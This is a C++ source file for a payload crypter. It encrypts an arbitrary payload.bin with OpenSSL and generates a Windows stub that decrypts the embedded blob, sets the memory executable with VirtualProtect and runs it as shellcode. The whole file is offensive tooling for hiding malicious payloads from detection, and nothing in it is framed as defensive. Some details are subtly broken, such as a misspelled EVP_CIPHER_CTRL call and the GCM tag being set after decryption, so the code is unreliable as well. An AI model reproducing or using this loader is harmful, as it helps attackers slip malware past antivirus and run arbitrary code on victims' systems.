#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <sstream>
#include <iomanip>

#include <openssl/evp.h>
#include <openssl/rand.h>
#pragma comment(lib, "libcrypto.lib")

/* ---------- helpers ---------- */
std::vector<char> encrypt(const std::vector<char>& data,
                          const std::string& method,
                          std::vector<char>& keyOut,
                          std::vector<char>& ivOut,
                          std::vector<char>& tagOut)
{
    const EVP_CIPHER* cipher = nullptr;
    size_t keyLen = 0, ivLen = 0, tagLen = 0;

    if (method == "AES-256-GCM") { cipher = EVP_aes_256_gcm(); keyLen = 32; ivLen = 12; tagLen = 16; }
    else if (method == "AES-256-CBC") { cipher = EVP_aes_256_cbc(); keyLen = 32; ivLen = 16; tagLen = 0; }
    else if (method == "ChaCha20") { cipher = EVP_chacha20(); keyLen = 32; ivLen = 12; tagLen = 0; }
    else { std::cerr << "Unsupported cipher\n"; return {}; }

    keyOut.resize(keyLen);
    ivOut.resize(ivLen);
    RAND_bytes(reinterpret_cast<unsigned char*>(keyOut.data()), keyLen);
    RAND_bytes(reinterpret_cast<unsigned char*>(ivOut.data()), ivLen);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, cipher, nullptr,
                       reinterpret_cast<const unsigned char*>(keyOut.data()),
                       reinterpret_cast<const unsigned char*>(ivOut.data()));

    int outLen = 0, finalLen = 0;
    std::vector<char> out(data.size() + EVP_CIPHER_block_size(cipher));
    EVP_EncryptUpdate(ctx, reinterpret_cast<unsigned char*>(out.data()), &outLen,
                      reinterpret_cast<const unsigned char*>(data.data()), data.size());
    EVP_EncryptFinal_ex(ctx, reinterpret_cast<unsigned char*>(out.data()) + outLen, &finalLen);
    out.resize(outLen + finalLen);

    if (tagLen) {
        tagOut.resize(tagLen);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, tagLen,
                            reinterpret_cast<unsigned char*>(tagOut.data()));
    }
    EVP_CIPHER_CTX_free(ctx);
    return out;
}

/* ---------- stub ---------- */
std::string generateStub(const std::string& cipher,
                         const std::vector<char>& key,
                         const std::vector<char>& iv,
                         const std::vector<char>& tag,
                         const std::vector<char>& cipherBlob)
{
    std::ostringstream h;
    h << std::hex << std::setfill('0');
    auto hexDump = [&](const std::vector<char>& v) {
        for (unsigned char c : v) h << std::setw(2) << +c;
    };

    return R"(#include <windows.h>
#include <openssl/evp.h>
#pragma comment(lib,"libcrypto.lib")
int main() {
    unsigned char key[] = {)" +
           [&] { std::ostringstream s; for (unsigned char c : key) s << "0x" << std::setw(2) << +c << ","; return s.str(); }() + R"(};
    unsigned char iv[] = {)" +
           [&] { std::ostringstream s; for (unsigned char c : iv) s << "0x" << std::setw(2) << +c << ","; return s.str(); }() + R"(};
    unsigned char tag[] = {)" +
           [&] { if (!tag.empty()) { std::ostringstream s; for (unsigned char c : tag) s << "0x" << std::setw(2) << +c << ","; return s.str(); } else return ""; }() + R"(};
    unsigned char blob[] = {)" +
           [&] { std::ostringstream s; for (unsigned char c : cipherBlob) s << "0x" << std::setw(2) << +c << ","; return s.str(); }() + R"(};
    const EVP_CIPHER* c = )" +
           (cipher == "AES-256-GCM" ? "EVP_aes_256_gcm()" :
            cipher == "AES-256-CBC" ? "EVP_aes_256_cbc()" : "EVP_chacha20()") + R"(;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, c, NULL, key, iv);
    unsigned char plain[sizeof(blob) + EVP_CIPHER_block_size(c)];
    int outLen = 0, finalLen = 0;
    EVP_DecryptUpdate(ctx, plain, &outLen, blob, sizeof(blob));
    EVP_DecryptFinal_ex(ctx, plain + outLen, &finalLen);
    if (sizeof(tag) > 0) EVP_CIPHER_CTRL(ctx, EVP_CTRL_GCM_SET_TAG, sizeof(tag), tag);
    EVP_CIPHER_CTX_free(ctx);
    DWORD old; VirtualProtect(plain, outLen + finalLen, PAGE_EXECUTE_READWRITE, &old);
    ((void(*)())plain)();
    return 0;
})";
}

/* ---------- main ---------- */
int main() {
    std::string inFile = "payload.bin";
    std::string cipher = "AES-256-GCM";

    std::ifstream f(inFile, std::ios::binary);
    if (!f) { std::cerr << "payload.bin missing\n"; return 1; }
    std::vector<char> data((std::istreambuf_iterator<char>(f)),
                           std::istreambuf_iterator<char>());

    std::vector<char> key, iv, tag;
    auto blob = encrypt(data, cipher, key, iv, tag);

    std::ofstream stub("stub.cpp");
    stub << generateStub(cipher, key, iv, tag, blob);
    std::cout << "stub.cpp generated.\n";
    return 0;
}
